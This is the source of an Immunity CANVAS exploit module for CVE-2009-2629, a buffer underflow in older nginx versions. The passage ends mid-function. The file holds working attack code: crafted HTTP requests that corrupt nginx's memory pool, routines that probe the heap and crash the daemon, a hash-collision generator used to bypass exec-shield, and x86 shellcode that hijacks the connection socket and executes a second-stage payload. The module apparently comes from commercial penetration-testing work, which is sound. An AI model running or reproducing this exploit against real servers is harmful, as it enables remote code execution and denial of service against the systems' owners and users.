#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  nginx.py
## Description:
##            :
## Created_On :  Wed Jan 20 09:30:32 EST 2010
## Created_By :  Ronald Huizer
## Modified_On:  Thu Mar 11 10:03:03 EST 2010
## Modified_By:  Ronald Huizer
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
##
## vim: sw=4 ts=4 expandtab
###############################################################################
import sys
if '.' not in sys.path:
    sys.path.append('.')
import struct
import socket
import time
import errno

from MOSDEFShellServer import MosdefShellServer
from linuxNode import linuxNode
from shellcode import linuxshell, shellcodeGenerator
from encoder import chunkedaddencoder
from MOSDEF import mosdef
from MOSDEF.mosdefutils import *
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = 'nginx'
DOCUMENTATION['Date public'] = '10/29/2009'
DOCUMENTATION['CVE Name'] = 'CVE-2009-2629'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2629'
DOCUMENTATION['Repeatability'] = "Infinite"
DOCUMENTATION['References']=["http://www.kb.cert.org/vuls/id/180065"]
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['Notes'] = """

Use -O exec_shield:0 against Ubuntu targets - the default is to assume you want execshield 
avoidance.

"""
DESCRIPTION = 'Buffer Underflow in various versions of nginx'

PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Remote'
PROPERTY['ARCH'] = [ ['Linux', 'i386', '_all'] ]

NAME = "Jinx"
VERSION = "2"

DEVNOTES = """
This exploit only works against nginx-0.5.37 and below, and against
nginx-0.6.38 and below.

CAVEATS:

This exploit is still under development, these are things which can be
more dynamic or which do not work.  Most notably:

- It will NOT work properly for systems under load.  Nginx has an async IO
  core where all connections will mess up the state of the heap we are using.
  This effect can be flattened out by crashing the daemon more often and
  repeating operations settling for the most common results.  This hasn't
  been implemented yet.
- It will NOT work against x86-64, PAE kernels with NX support, PaX,
  and similar systems.  That being said, exec-shield evasion works.
- It may NOT work against really weird ass nginx configurations (forking
  multiple client handlers, adding custom modules to the source code, etc).

Request length:

The initial request pool page looks like this on x86-32:

The module ptrs and variables can change in size, while the
other parts are static.  Disregarding modules and variables,
the minimum URI length to get a complex URI allocated on its
own page is 4096 - 512 + 1 = 3585 bytes.

We assume that modules and variables are at least a few bytes big, so
that we can verify the scanned length by adding 256 to the result.  This
addition could in theory end up at 0x....2f2f which is a situation we do
not yet address.  We can later do this by creating a certain number of
initial connections before launching the probing/attacking one.

Anyhow, we use requests of a base length of NGX_MAX_ALLOC_FROM_POOL - 512 ==
3583 bytes.

  -- ronald

Nginx 0.7.31 has a different pool layout; we try to detect this.

Request pool layout of the 1st pool page
 [ ngx_pool_t: 32 bytes ]
 [ r->headers_out.headers: 480 bytes ]
 [ modules ptrs: 128 bytes ]
 [ variables: 48 bytes ]

Modules:
  * nginx-0.5.37, nginx-0.6.38
    These versions have 32 HTTP modules, resulting in 128 bytes of pointers
  * nginx-0.7.61
    This version has 33 HTTP modules, resulting in 132 bytes of pointers

Tested against:
  * nginx-0.5.34, nginx-0.5.37, nginx-0.6.38

You'll want to do this to install it on Ubuntu, probably:

immunity@immunity-desktop:~/Desktop/nginx-0.6.38$ sudo apt-get install      \
libc6-dev dd libc6 libpcre3 libpcre3-dev libpcrecpp0 libssl0.9.8 libssl-dev \
zlib1g zlib1g-dev lsb-base
"""

#should be 0, 1, and 2, but for now, we leave as-is
targets = {
    0: ['Nginx 0.5.x and 0.6.y with x <= 37 and y <= 38'],
    1: ['Nginx 0.7.x']
}

import ctypes
import sys

# ngx_hash() first preimage collision generator.  This generates a lowercase
# string that hashes to a given hash value, and ensures every.
#
# Generator ideas courteously provided by Willem-Jan Palenstijn and Lennert
# Buytenhek.  Ported to Python by Bas Alberts.
class BrakkeHash:

    """
    A NGINX header hash collision generator.
    """

    def compute_hash_a(self, length):
        h = 0;
        for i in range(0, length):
            h = ctypes.c_uint32(h * 31).value
            h = ctypes.c_uint32(h + ord('a')).value
        return h

    def decompose(self, x, coeff, length):
        for i in range(0, length):
            coeff[length - 1 - i] = x % 31;
            if coeff[length - 1 - i] > 25:
                return 1

            coeff[length - 1 - i] = \
                 ctypes.c_uint8(coeff[length - 1 - i] + ord('a')).value
            x = ctypes.c_uint64(x / 31).value
        if x:
            return 2
        return 0

    def hash(self, x, len):
        h = 0
        for i in range(0, len):
            h = ctypes.c_uint32(h * 31).value
            h = ctypes.c_uint32(h + x[i]).value
        return h

    def solve(self, h, length):
        foo = 0
        coeff = [0 for i in range(0, length)]
        rc = 0 # retval
        s = '' # retstr

        foo = ctypes.c_uint32(h - self.compute_hash_a(length)).value
        while True:
            rc = self.decompose(foo, coeff, length)
            if rc == 0:
                s = ''.join(['%c' % chr(c) for c in coeff])
                break
            if rc == 1:
                # try the next one
                foo = ctypes.c_uint64(foo + 0x100000000).value
                continue
            if rc == 2:
                break
        # retval is a tupe of return code and colliding string
        return rc,s


# Error codes used in self.errno
JINX_ERROR_SUCCESS = 0
JINX_ERROR_CRASH = 1
JINX_ERROR_DISTANCE = 2
JINX_ERROR_CONNECT = 3
JINX_ERROR_SEND = 4
JINX_ERROR_POOL = 5
JINX_ERROR_RECV = 6
JINX_ERROR_TIMEOUT = 7
JINX_ERROR_SCAN = 8

# Different struct ngx_pool_s layout we enumerate
JINX_POOL_NONE = 0
JINX_POOL_LEGACY = 1
JINX_POOL_NEW = 2

# Different attack types -- we yet need to implement JINX_ATTACK_NEW_STACK
JINX_ATTACK_STACK = 1
JINX_ATTACK_DSO = 2
JINX_ATTACK_NEW_DSO = 3

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.errno = JINX_ERROR_SUCCESS
        self.exec_shield = 1
        self.port = 80
        self.sd = -1
        self.csd = -1
        self.NGX_ALIGNMENT = 4
        self.STACK_START = 0xbf700000   # Linux ASLR stack address is the set [0xbf700000, 0xc0000000)
        self.STACK_END = 0xc0000000
        self.DSO_START = 0x00100000     # Linux ASLR DSO address is the set [0x00100000, 0x01000000)
        self.DSO_END = 0x01000000
        self.debug = False

        # Exploitation context
        self.ctx_length = 0                 # URI length needed to align pool->last on 0x2F
        self.ctx_stack = 0                  # Lowest address of the stack scanned for
        self.ctx_dso = 0                    # DSO W^X address scanned for
        self.pool_type = JINX_POOL_NONE     # Type of ngx_pool_s we are dealing with
        
        self.version = 0
        self.name = NAME 
        return

    def strerror(self):
        return { JINX_ERROR_SUCCESS : "Success",
                 JINX_ERROR_CRASH : "Failed to crash nginx daemon",
                 JINX_ERROR_DISTANCE : "Failed to find distance to make pool->last end with 0x2F",
                 JINX_ERROR_CONNECT : "Failed to connect to nginx daemon",
                 JINX_ERROR_SEND : "Failed to send data to nginx daemon",
                 JINX_ERROR_POOL : "Failed to find 1st pool page free space",
                 JINX_ERROR_RECV : "Failed to receive data from nginx daemon",
                 JINX_ERROR_TIMEOUT : "Connection timed out",
                 JINX_ERROR_SCAN : "Failed to find writeable page" }[self.errno]

    def test(self):
        self.getArgs()
        self.log('nginx exploit testing: HOST: %s PORT: %s Execshield: %s' % (repr(self.host), repr(self.port),self.exec_shield))

        self.sd = self.gettcpsock()
        try:
            self.sd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            self.log('[!] %s' % self.strerror())
            self.log("Version not vulnerable, we believe")
            return False

        # First we'll check if the server answers GET requests in the first place.
        # This eliminates positive matches for servers which just close the port.
        try:
            self.sd.sendall('GET / HTTP/1.0\r\n\r\n')
        except:
            self.sd.close()
            self.errno = JINX_ERROR_SEND
            self.log('[!] %s' % self.strerror())
            self.log("Version not vulnerable, we believe")
            return False

        # We are content with a response starting out with 'HTTP/'
        try:
            ret = self.sd.recv(1024)
        except:
            self.log("Version not vulnerable, we believe")
            return False
        finally:
            self.sd.close()

        if len(ret) == 0 or not ret.startswith('HTTP/'):
            return False

        self.sd = self.gettcpsock()
        try:
            self.sd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            self.log('[!] %s' % self.strerror())
            self.log("Version not vulnerable, we believe")
            return False

        # We know the server responds to requests now, try it with an attack string.
        # This will not crash the daemon, but it will result in a log entry on a failed
        # allocation, and the daemon will close the connection.
        try:
            self.sd.sendall('GET /.%23./ HTTP/1.0\r\n\r\n')
        except:
            self.sd.close()
            self.errno = JINX_ERROR_SEND
            self.log('[!] %s' % self.strerror())
            self.log("Version not vulnerable, we believe")
            return False

        try:
            ret = self.sd.recv(1024)
        except:
            self.log("Version not vulnerable, we believe")
            return False
        else:
            if not len(ret):
                self.log("Found vulnerable version!")
                return True
        finally:
            self.sd.close()
        self.log("Version not vulnerable, we believe")
        return False

    def displayVersions(self):
        for key, value in targets.iteritems():
            print '%d: %s' % (key, value)

    def neededListenerTypes(self):
        # e.g. canvasengine.LINUXMOSDEF_INTEL
        #We steal the socket, in this case. No need for listener.
        return []


    def checker_init(self):
        self.csd = self.gettcpsock()
        try:
            self.csd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            return -1

        try:
            self.csd.sendall("G")
        except:
            self.csd.close()
            self.errno = JINX_ERROR_SEND
            return -1


    def checker(self):
        try:
            self.csd.sendall("ET / HTTP/1.0\r\n\r\n")
        except:
            self.errno = JINX_ERROR_SEND
            return -1

        # Try to read data from the server.  In case we get an exception or a read
        # with a length of 0, we assume things have crashed and return success.
        try:
            ret = self.csd.recv(4096)
        except timeoutsocket.Timeout:
            self.errno = JINX_ERROR_TIMEOUT
            return -1
        except socket.error, (errnum, msg):
            if errnum == errno.ECONNRESET:
                return 1
            return -1
        else:
            if not len(ret):
                return 1
        finally:
            self.csd.close()

        return 0

    def createShellcode(self):
        # custom socket recycling for NGINX
        asm = """
// set everything to blocking
    xorl %ebx,%ebx
    movl $1024,%ebx

set_blocking:
    decl %ebx
    xorl %eax,%eax
    xorl %ecx,%ecx
    xorl %edx,%edx
    movb $3,%cl // F_GETFL
    movb $55,%al 
    int $0x80
    andl $0xfffff7ff,%eax // ~O_NONBLOCK
    xchg %eax,%edx    
    movb $4,%cl // F_SETFL
    movb $55,%al
    int $0x80
    test %ebx,%ebx
    jnz set_blocking
done_blocking:

start:

    // ignore SIGPIPE
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    xorl    %eax,%eax
    movb    $13,%bl  
    incl    %ecx     
    movb    $48,%al  
    int     $0x80    

gofindsock:
    // the bitmask we maintain
    xorl    %eax,%eax
    xorl    %ecx,%ecx
    movb    $32,%cl  

pushmask:
    pushl   %eax
    loop    pushmask

    // push fd count
    movw    $1024,%cx
    pushl   %ecx

    // save base
    movl    %esp,%esi

check_fds:
    xorl    %ebx,%ebx
    decl    %ebx
    xorl    %eax,%eax
    // start at 1024, real start 1023
    decl    (%esi)

    // -1 ? done
    cmpl    (%esi),%ebx
    je      bitmask_done

    xorl    %ecx,%ecx
    movb    $5,%cl   

pusharg:
    pushl   %eax
    loop    pusharg

    movl    %esp,%edi

    movb    $0x10,%al
    movl    %eax,16(%edi)
    // socklen_t *namelen
    leal    16(%edi),%ecx
    pushl   %ecx
    pushl   %edi

    xorl    %ebx,%ebx
    movb    $7,%bl

    movb    $102,%al 
    // push fd count 
    pushl   (%esi)   
    movl    %esp,%ecx
    int     $0x80    

    // get result    
    movl    (%edi),%eax
    cmpb    $10,%al
    je      trigger
    cmpb    $2,%al
    je      trigger  

    movl    %esi,%esp
    jmp     check_fds

trigger:
    // reset to base
    movl    %esi,%esp

    xorl    %eax,%eax
    xorl    %ecx,%ecx
    // send JINX
    pushl   $0x584e494a
    movl    %esp,%ecx
    pushl   %eax
    movb    $4,%al
    pushl   %eax
    pushl   %ecx
    pushl   (%esi)   
    movl    %esp,%ecx
    xorl    %eax,%eax
    xorl    %ebx,%ebx
    movb    $9,%bl
    movb    $102,%al   
    int     $0x80

    // reset to base 
    movl    %esi,%esp
    cmpb    $4,%al
    jne     check_fds

    // add to mask 
    // start of first dword in mask
    leal    4(%esi),%edi
    movl    (%esi),%ecx
    xorl    %eax,%eax
    xorl    %ebx,%ebx
    xorl    %edx,%edx
    movb    $32,%al
    movb    $4,%dl
    incl    %ebx

    // first find the right dword in the mask

index_mask:
    cmpl    %eax,%ecx
    jge     up_index 

    // we're at the right word, bit to set is in %ecx
shift_it:
    test    %ecx,%ecx
    jz      zero_fd
    shll    $1,%ebx
    loop    shift_it
zero_fd:
    // or in the right bit
    orl     %ebx,(%edi)

    jmp     check_fds

up_index:
    subl    %eax,%ecx
    addl    %edx,%edi
    jmp     index_mask

bitmask_done:

    // call select on our mask
    xorl    %ebx,%ebx
    movw    $1024,%bx
    leal    4(%esi),%ecx
    xorl    %edx,%edx
    pushl   %esi     
    xorl    %esi,%esi
    // timeout
    pushl   %edx
    pushl   $4
    movl    %esp,%edi  
    xorl    %eax,%eax
    movb    $142,%al
    int     $0x80    
    // restore base ref
    movl    8(%esp),%esi

    test    %eax,%eax
    jz      restart

    // check result
    leal    4(%esi),%esp
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    popl    %edi   

loop_mask:

    cmpb    $32,%bl
    jne     nopop
    popl    %edi
    xorl    %ebx,%ebx
nopop:
    // shift right ! 
    shrl    $1,%edi
    jc      check_trigger
notrigger:
    incl    %ecx
    cmpw    $1024,%cx
    je      restart
    incl    %ebx
    jmp     loop_mask

check_trigger:
    pushl   %esp
    pushl   %ebx
    pushl   %ecx

    // got a return fd in ecx
    xorl    %eax,%eax
    pushl   %eax
    movl    %esp,%edx
    pushl   %eax
    movb    $4,%al
    pushl   %eax
    pushl   %edx
    pushl   %ecx
    xorl    %ebx,%ebx
    movb    $10,%bl
    movl    %esp,%ecx
    movb    $102,%al 
    int     $0x80

    addl    $20,%esp
    popl    %ecx
    popl    %ebx
    popl    %esp

    movl    (%edx),%eax
    // check for JINX received
    cmpl    $0x584e494a,%eax  
    je      trigger_success

    jmp     notrigger

restart:
    addl    $128,%esi
    movl    %esi,%esp
    jmp     gofindsock  

trigger_success:
    // sleep a little to make sure len value is on the wire
    // we're not using select etc. anymore because we're in
    // a predictable world now

    // NANOSLEEP PATCH
    pushl %ecx
    xorl %eax,%eax
    xorl %ebx,%ebx
    xorl %ecx,%ecx
    pushl %ebx
    movb $2,%bl // wait 2 seconds
    pushl %ebx
    movl %esp,%ebx
    movb $162,%al 
    int $0x80 
    popl %eax 
    popl %eax
    popl %ecx
    //done nanosleep

    // fd in %ecx 
    movl    %ecx,%ebx
    xorl    %eax,%eax
    xorl    %edx,%edx
    // read the first 4 bytes..len value
    movb    $4,%dl
    movl    %esp,%ecx
    movb    $3,%al
    int     $0x80    
    cmpb    $0xff,%ah
    // jmp to exit on -1 .... this will loop if failure right now
    je      trigger_success
    movl    (%esp),%edi

    // our total len is in %edi..let the games begin
    // wanna read into pcloc
    jmp read_here
getmyloc:
    // copy to modify
    pushl (%esp)
readexecloop:
    xorl %eax,%eax
    movl %edi,%edx
    movl (%esp),%ecx
    movb $3,%al
    int $0x80
    cmpb $0xff,%ah
    je exit
    cmpl %edi,%eax
    je execute
    subl %eax,%edi
    add %eax,(%esp)
    jmp readexecloop

execute:
    // jmp to execute .. ebx has the fd
    popl %esi
    popl %esi
    jmp *%esi

exit:
    xorl %ebx,%ebx
    xorl %eax,%eax
    incl %eax
    int $0x80

read_here:
    call getmyloc

end:
        """
        sc = mosdef.assemble(asm, 'X86')
        ec = chunkedaddencoder.intelchunkedaddencoder()
        ec.setbadstring('\r\n ')
        # encode raw shellcode to self.shellcode
        self.shellcode = ec.encode(sc)
        self.log('[!] Length of shellcode: %d' % len(self.shellcode))
        return self.shellcode

    def getArgs(self):
        self.host = self.target.interface
        self.getarg("port")
        self.getarg("exec_shield")
        self.getarg("debug")
        return

    def __try_length(self, length):
        # We crash the daemon every time.  This is completely ugly, but
        # the async. nature of nginx makes the heap shift under our feet
        # rapidly if the server is under load.
        # Crashing the daemon and trying several times while applying a
        # majority rule works, although it makes me want to vomit.
        #if self.crash_daemon() == -1:
        #    return -1

        s = ''
        self.sd = self.gettcpsock()
        try:
            self.sd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            return -1

        s += 'GET /.%23./'
        # Overwrite the last 3 bytes of pool->last.  This should
        # cause crashes if we hit pool->last.
        s += '%00%00%00'
        # Use long requests to make sure our data ends up on its
        # own pool, so that directly before our data we will
        # have a ngx_pool_t area.  We use '#' to avoid overwriting
        # with all of our request data.
        s += '#' + 'B' * length
        s += ' HTTP/1.0\r\n'
        # Fill the first allocated page with headers, so the second one
        # we corrupted will be used during header processing.
        s += 'A\r\n' * 200
        # Adding an invalid 'Host' header errors out earlier, and
        # makes sure we don't crash in weird ways and avoid log
        # entries.
        s += 'Host: .\r\n'
        # We add a header with a '/' in it, to avoid false
        # positives if we scan into this space.  'AAA' will be
        # overwritten with 0-bytes in this case.
        s += 'X-Foo: /AAA\r\n\r\n'

        try:
            self.sd.sendall(s)
        except:
            self.sd.close()
            self.errno = JINX_ERROR_SEND
            return -1

        # If we crash out we have likely found the correct distance.
        try:
            ret = self.sd.recv(1024)
        except timeoutsocket.Timeout:
            self.errno = JINX_ERROR_TIMEOUT
            return -1
        except socket.error, (errnum, msg):
            if errnum == errno.ECONNRESET:
                return 1
            return -1
        else:
            if not len(ret):
                return 1
        finally:
            self.sd.close()

        return 0

    def verify_length(self, length):
        return self.__try_length(length + 256)

    def determine_length(self):
        """
        For 0.5 and 0.6
        """
        # __try_length uses 11 bytes for its own purposes.
        for i in range(3583 - 11, 3583 + 256 - 11):
            #self.log("Trying length: %d"%i)
            ret = self.__try_length(i)
            if ret == 0:
                continue
            elif ret == -1:
                self.log("Bailing out of trying to find candidates")
                return -1

            self.log('    [?] Found candidate: %d' % i)

            if (self.verify_length(i)):
                self.log('    [+] Verified candidate: %d' % i)
                self.ctx_length = i
                return 0
            else:
                self.log('  [-] Eliminated candidate: %d' % i)

        self.errno = JINX_ERROR_DISTANCE
        return -1

    def verify_length_new(self, length):
        """
        For 0.7 and 0.8
        """
        return self.__try_length(length + 256) or self.__try_length(length + 512)

    def determine_length_new(self):
        """
        For versions 0.7 and 0.8. Determines the length of the string it
        needs to trigger the flaw - assumes you are the first connection (i.e.
        you have just crashed the server and it has restarted).
        """
        for i in range(256, 512):
            ret = self.__try_length(i)
            if ret == 0:
                continue
            elif ret == -1:
                return -1

            self.log('    [?] Found candidate: %d' % i)

            if (self.verify_length(i)):
                self.log('    [+] Verified candidate: %d' % i)
                self.ctx_length = i
                return 0
            else:
                self.log('  [-] Eliminated candidate: %d' % i)

        self.errno = JINX_ERROR_DISTANCE
        return -1

    def ngx_align_ptr(self, p, a):
        return (uint32(p) + uint32(a - 1)) & ~(uint32(a-1))

    # Attack through stack area mapped from start to end
    def attack_range(self, type, start, end):
        step = 4096

        # If start happens to be larger than end, work backwards.
        if start > end:
            step = -4096

        while (start < end and step > 0) or (end < start and step < 0):
            # Corner cases as we do not want to include a '/'
            for x in (0, 8, 16, 24):
                if ((start >> x) & 0xFF) == ord('/'):
                    if step > 0:
                        start += (1 << x)
                    else:
                        start -= (1 << x)

                if type == JINX_ATTACK_STACK:
                    self.ctx_stack = start
                else:
                    self.ctx_dso = start

                # If the return value is not False, we assume it is a MOSDEF
                # node and are done.
                if type == JINX_ATTACK_NEW_DSO:
                    node = self.attack_new(type)
                else:
                    node = self.attack(type)
                if node != False:
                    return node

                start += step

        return False

    # Function that tries to scan for writeable pages by getting nginx
    # to use them in the allocator.  This is not completely fool proof,
    # and the code is left here to plug in when debugging, as it is much
    # easier to debug a multi-stage exploit.
    def scan_range(self, start, end):
        step = 4096

        # If start happens to be larger than end, work backwards.
        if start > end:
            step = -4096

        while (start < end and step > 0) or (end < start and step < 0):
            # Corner cases as we do not want to include a '/'
            for x in (0, 8, 16, 24):
                if ((start >> x) & 0xFF) == ord('/'):
                    if step > 0:
                        start += (1 << x)
                    else:
                        start -= (1 << x)

            s = ''
            self.sd = self.gettcpsock()
            try:
                self.sd.connect((self.host, self.port))
            except:
                self.errno = JINX_ERROR_CONNECT
                return -1

            s += 'GET /.%23./'
            # overwrite pool->last with the address we scan
            s += '%%%.2x' % ((start >>  8) & 0xFF)
            s += '%%%.2x' % ((start >> 16) & 0xFF)            
            s += '%%%.2x' % ((start >> 24) & 0xFF)
            # overwrite pool->end: we only reserve space for the
            # header list elements, to not clobber more than we
            # have to.
            j = self.ngx_align_ptr(start + ord('/'), self.NGX_ALIGNMENT)
            j = self.ngx_align_ptr(j + 480 + 8, self.NGX_ALIGNMENT)
            s += '%%%.2x' % ( j        & 0xFF)
            s += '%%%.2x' % ((j >>  8) & 0xFF)
            s += '%%%.2x' % ((j >> 16) & 0xFF)            
            s += '%%%.2x' % ((j >> 24) & 0xFF)

            s += '#' + 'B' * (self.ctx_length - 12)
            s += ' HTTP/1.0\r\n'
            # Allocate enough space through headers to run into the second pool
            s += 'A\r\n' * 200
            # Avoid going to deep into nginx code by erroring out fast.
            s += 'Host: .\r\n\r\n'

            try:
                self.sd.sendall(s)
            except:
                self.sd.close()
                self.errno = JINX_ERROR_SEND
                return -1

            try:
                ret = self.sd.recv(1024)
                if len(ret):
                    return start
            except timeoutsocket.Timeout:
                raise
            except:
                pass
            finally:
                self.sd.close()

            start += step

        self.errno = JINX_ERROR_SCAN
        return -1

    def probe_pool_layout(self):
        s = ''
        self.sd = self.gettcpsock()
        try:
            self.sd.connect((self.host, self.port))
        except:
            self.errno = JINX_ERROR_CONNECT
            return -1

        s += 'GET /.%23./'
        # pool->last -- point to stack space we determined; offset 0x30
        last = (self.ctx_stack & 0xFFFFFF00) | 0x30;
        s += "%%%.2x" % ((last >>  8) & 0xFF)
        s += "%%%.2x" % ((last >> 16) & 0xFF)
        s += "%%%.2x" % ((last >> 24) & 0xFF)

        # pool->end
        end = last + 480
        s += "%%%.2x" % ((end >>  0) & 0xFF)
        s += "%%%.2x" % ((end >>  8) & 0xFF)
        s += "%%%.2x" % ((end >> 16) & 0xFF)
        s += "%%%.2x" % ((end >> 24) & 0xFF)

        # pool->current or pool->next
        # If we keep adding large headers, so that we keep pool page 1 in business, and
        # deplete pool page 2, then if pool->next is here and not NULL it will be dereffed
        # causing a crash.  For legacy allocator it will be current, and nothing will crash.
        s += "%ff%ff%ff%ff"

        s += '#' + 'B' * (self.ctx_length - 2 * 12)
        s += ' HTTP/1.0\r\n'

        # And add enough headers to run into pool page 3.
        s += ('A' * 100 + '\r\n') * 50;
        s += 'Host: .\r\n\r\n'

        try:
            self.sd.sendall(s)
        except:
            self.sd.close()
            self.errno = JINX_ERROR_SEND
            return -1

        # Initialize death checker
        if self.checker_init() == -1:
            return -1

        try:
            ret = self.sd.recv(4096)
        except socket.error, (errnum, msg):
            if errnum == errno.ECONNRESET and self.checker() == 1:
                return JINX_POOL_NEW
            return -1
        else:
            # If both connections died, we have a new pool layout.
            if not len(ret) and self.checker() == 1:
                return JINX_POOL_NEW
        finally:
            self.sd.close()

        return JINX_POOL_LEGACY

# Probe how many headers are needed before nginx crashes now that we know the distance.
# This way we can determine how much space of the first pool page is used before we
# run into the second one.
# This function will only provide a lower-bound on the amount of data needed, because
# of post allocations.
    def probe_pool_use(self):
        # XXX: we could binary search this.
        for i in range(0, 4096 / 4):
            # Crash the daemon, the last request kept it alive.
            #if self.crash_daemon() == -1:
                #   self.errno = JINX_ERROR_CRASH
                #   return -1

            s = ''
            self.sd = self.gettcpsock()
            try:
                self.sd.connect((self.host, self.port))
            except:
                self.errno = JINX_ERROR_CONNECT
                return -1

            s += 'GET /.%23./'
            # pool->last -- point to 0x0000002F in order to crash out.
            s += '%00%00%00'
            # pad out until we reach the proper URI length
            s += '#' + 'B' * (self.ctx_length)
            s += ' HTTP/1.0\r\n'

            # We may have a NGX_HAVE_NONALIGNED compile, so we use 4 bytes at a time.
            s += 'AAAA' * i + '\r\n';
            # The ngx_palloc() of the lowercase 'Host' key will use pool2->last and cause
            # a crash.
            s += 'Host: .\r\n\r\n'

            try:
                self.sd.sendall(s)
            except:
                self.sd.close()
                self.errno = JINX_ERROR_SEND
                return -1

            try:
                ret = self.sd.recv(1024)
                if not len(ret):
                    return i
            except:
                return i

        self.errno = JINX_ERROR_POOL
        return -1

    def crash_daemon(self):
        for i in range(2048, 0, -1):
            s = ''
            self.sd = self.gettcpsock()
            try:
                self.sd.connect((self.host, self.port))
            except:
                self.errno = JINX_ERROR_CONNECT
                return -1

            s += 'GET /.%23./'  
            s += 'Z' * (1000 + i)
            s += ' HTTP/1.0\r\nHost: .\r\n\r\n'

            # Have the checker connection connect now
            if self.checker_init() == -1:
                return -1

            # Send the crash request
            try:
                self.sd.sendall(s)
            except:
                self.sd.close()
                self.errno = JINX_ERROR_SEND
                return -1

            # If the receive fails or returns 0 we assume the daemon crashed out.
            # This is what we're aiming to do.
            try:
                ret = self.sd.recv(1024)
            except socket.error, (errnum, msg):
                if errnum != errno.ECONNRESET:
                    return -1

                if self.checker() == 1:
                    return 0
            else:
                if not len(ret) and self.checker() == 1:
                    return 0
            finally:
                self.sd.close()

        self.errno = JINX_ERROR_CRASH
        return -1

    def create_attack_stack_string(self):
        s = ''
        s += 'GET /.%23./'
        # pool->last -- point to stack space we determined; offset 0x30
        last = (self.ctx_stack & 0xFFFFFF00) | 0x30;
        s += "%%%.2x" % ((last >>  8) & 0xFF)
        s += "%%%.2x" % ((last >> 16) & 0xFF)
        s += "%%%.2x" % ((last >> 24) & 0xFF)

        self.log('    [ ] Setting up 20 element ngx_table_elt_t array at: 0x%.8X' % last)

        # pool->end
        end = last + 480
        s += "%%%.2x" % ((end >>  0) & 0xFF)
        s += "%%%.2x" % ((end >>  8) & 0xFF)
        s += "%%%.2x" % ((end >> 16) & 0xFF)
        s += "%%%.2x" % ((end >> 24) & 0xFF)

        # pool->current -- irrelevant
        s += "%00%00%00%00"
        # pool->chain
        s += "%00%00%00%00"
        # pool->next
        s += "%00%00%00%00"
        # pool->large
        s += "%00%00%00%00"
        # pool->cleanup
        s += "%00%00%00%00"
        # pool->log; our fake overlapping ngx_log_s structure will now
        # reside at offset 0x4C on the stack page.
        fake_log = (self.ctx_stack & 0xFFFFFF00) | 0x4C;
        self.log('    [ ] Overlapping ngx_log_t and ngx_table_elt_t at: 0x%.8X' % fake_log);
        s += "%%%.2x" % ((fake_log >>  0) & 0xFF)
        s += "%%%.2x" % ((fake_log >>  8) & 0xFF)
        s += "%%%.2x" % ((fake_log >> 16) & 0xFF)
        s += "%%%.2x" % ((fake_log >> 24) & 0xFF)

        s += '#' + 'B' * (self.ctx_length - 7 * 12)
        s += ' HTTP/1.0\r\n'

        # We may have a NGX_HAVE_NONALIGNED compile, so we use at least 4
        # bytes.  8 bytes seems to give the correct layout now.
        s += 'AAAAAAAA\r\n' * 101

        # 0x34 0x00 is "xor al, 0" which we execute to skip past the 0 byte
        # past the header key value to run into the header value which can
        # be virtually anything.
        s += "A:%s\r\n" % self.shellcode
        s += 'Host: .\r\n\r\n'

        return s

    def create_attack_exec_shield_string(self):
        s = ''
        s += 'GET /.%23./'
        # pool->last -- point to stack space we determined; offset 0x30
        last = (self.ctx_dso & 0xFFFFFF00) | 0x30;
        s += "%%%.2x" % ((last >>  8) & 0xFF)
        s += "%%%.2x" % ((last >> 16) & 0xFF)
        s += "%%%.2x" % ((last >> 24) & 0xFF)

        # pool->end
        end = last + 480 + 256 + 19 * 4 + 8 * 12 + 255
        s += "%%%.2x" % ((end >>  0) & 0xFF)
        s += "%%%.2x" % ((end >>  8) & 0xFF)
        s += "%%%.2x" % ((end >> 16) & 0xFF)
        s += "%%%.2x" % ((end >> 24) & 0xFF)

        # pool->current -- irrelevant
        s += "%00%00%00%00"
        # pool->chain
        s += "%00%00%00%00"
        # pool->next
        s += "%00%00%00%00"
        # pool->large
        s += "%00%00%00%00"
        # pool->cleanup
        s += "%00%00%00%00"
        # pool->log; our fake overlapping ngx_log_s structure will now
        # reside at offset 0x4C on the stack page.
        fake_log = (self.ctx_dso & 0xFFFFFF00) | 0x3C;
        log_handler = fake_log + 36

        self.log('    [ ] Trying to find hash that collides to 0x%.8X' % log_handler)
        bh = BrakkeHash()
        for l in range(8, 32):
            rc,hash = bh.solve(log_handler, l)
            if rc == 0:
                self.log("    [+] H[%s] = 0x%.8X for length %d" % (hash, log_handler, l))
                break

        if rc == 2:
            self.log("    [-] Failed")
            return -1

        self.log('    [ ] Setting up 20 element ngx_table_elt_t array at: 0x%.8X' % last)
        self.log('    [ ] Overlapping ngx_log_t and ngx_table_elt_t at: 0x%.8X' % fake_log)
        s += "%%%.2x" % ((fake_log >>  0) & 0xFF)
        s += "%%%.2x" % ((fake_log >>  8) & 0xFF)
        s += "%%%.2x" % ((fake_log >> 16) & 0xFF)
        s += "%%%.2x" % ((fake_log >> 24) & 0xFF)

        s += '#' + 'B' * (self.ctx_length - 7 * 12)
        s += ' HTTP/1.0\r\n'

        # We may have a NGX_HAVE_NONALIGNED compile, so we use at least 4
        # bytes.  8 bytes seems to give the correct layout now.
        s += 'AAAAAAAA\r\n' * 100

        # xorl: figure this out.
        s += 'AAAAAAAA:AAAAAAAA\r\n'
        s += hash + "\r\n"
        s += "btyazoyu\r\n"
        s += "ayhomxnc\r\n"
        s += "aaaaaaaaaaaboecgrth\r\n"
        s += "aaaaaaaaaaabeobgypr\r\n"
        s += "atplsyqo\r\n"
        s += "a" * 248 + "gnblisc:%s\r\n" % self.shellcode

        # Pad out the header list so that we trigger ngx_log_error() for the
        # next header processed.
        s += "AAAAAAAA\r\n" * 12

        # The invalid Host header again.  This one will not fit in the page
        # we faked anymore, causing a call to ngx_log_error() through
